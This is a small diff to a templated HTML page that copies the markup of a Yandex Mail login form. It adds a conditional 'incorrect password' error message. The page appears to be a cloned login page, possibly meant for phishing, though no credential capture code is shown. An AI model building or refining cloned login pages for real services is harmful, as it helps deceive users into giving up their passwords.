@@ -94,6 +94,8 @@
                                                                     name="login" placeholder="Логин или email"
                                                                     value=""/><span class="Textinput-Box"></span></span>
                                                             </div>
+                                                            {% if incorrect_password %}
+    <div id="field:input-passwd:hint" data-t="field:input-passwd:hint" aria-live="polite" class="Textinput-Hint Textinput-Hint_state_error">Неправильный пароль</div>{% endif %}
                                                             <div class="Field-link" data-t="field:link-login"
                                                                  id="field:link-login"><a data-t="link:default"
                                                                                           href="/auth/restore/login?retpath=https%3A%2F%2Fmail.yandex.ru"
